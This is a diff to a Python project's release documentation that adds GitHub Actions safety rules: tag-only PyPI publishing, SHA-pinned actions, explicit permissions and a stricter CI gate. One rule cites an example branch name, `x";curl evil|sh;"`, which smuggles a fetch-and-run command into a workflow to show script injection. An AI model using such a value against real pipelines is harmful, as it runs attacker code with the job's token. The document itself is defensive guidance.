@@ -194,6 +194,29 @@ recovery paths:
 - **Phase 8 fails (tag-protection)**: the tag is already pushed. Investigate the failing check; do
   not delete the tag without understanding why protection failed.
 
+## Workflow Safety
+
+These rules keep a compromised branch name, action or dispatch from publishing or running code:
+
+- **PyPI only from a `v*` tag.** `publish.yml` can be started by hand, but the PyPI job runs only
+  when the ref is a tag named `v…`. A Test PyPI run (`test_pypi: true`) may start from any ref. Also
+  restrict the `pypi` environment to tags in the repository settings (Settings → Environments →
+  `pypi` → Deployment branches and tags); a workflow cannot enforce that for itself.
+- **Branch names are data, not script.** `${{ github.head_ref }}`, `${{ github.base_ref }}` and the
+  like are passed through `env:` and read as `"$VAR"`. Writing them inside a `run:` block lets a
+  branch named `x";curl evil|sh;"` run commands with the job's token.
+- **A skipped test job is not a pass.** `scripts/gate_checks.py ci-status` needs at least one
+  `test (…)` run that succeeded, and a failed `Lint` fails the gate. If lint fails, the test matrix
+  is skipped, and an all-skipped matrix once read as success.
+- **The tag must be an ancestor of `origin/main`** (`git merge-base --is-ancestor`), not merely
+  appear in a branch whose name contains `origin/main`.
+- **Actions are pinned to commit SHAs**, with the version in a trailing comment, because a tag or
+  branch such as `@v4` or `@release/v1` can be moved. `publish.yml` holds `id-token: write`, so an
+  unpinned publish action could mint a PyPI token. Dependabot (`.github/dependabot.yml`) opens a PR
+  when a pinned action has a new release.
+- **Every workflow declares `permissions:`** at the top, `contents: read` unless a job needs more.
+  `tests/test_workflows.py` checks the last three rules.
+
 ## When _Not_ to Use the Script
 
 Use the script for normal releases. Hand-edit only when:
@@ -201,7 +224,7 @@ Use the script for normal releases. Hand-edit only when:
 - Recovering from a botched release where the tag/PyPI state is inconsistent. Document what happened
   in the changelog or a follow-up commit so the next release flow has context.
 - Cutting a Test PyPI release for verification — use the manual `workflow_dispatch` on `publish.yml`
-  with `test_pypi: true`.
+  with `test_pypi: true`. A real PyPI publish by hand must also run from a `v*` tag.
 
 ## Related Files
 
@@ -209,5 +232,7 @@ Use the script for normal releases. Hand-edit only when:
 - `.github/workflows/ci.yml` — runs on PRs and pushes to main
 - `.github/workflows/tag-protection.yml` — gates tag pushes
 - `.github/workflows/publish.yml` — builds and uploads to PyPI
+- `.github/dependabot.yml` — keeps the pinned action SHAs current
+- `tests/test_workflows.py` — checks the workflow safety rules above
 - `pyproject.toml` — version source (alongside `__init__.py`)
 - `src/ai_launcher/__init__.py` — version source (alongside `pyproject.toml`)
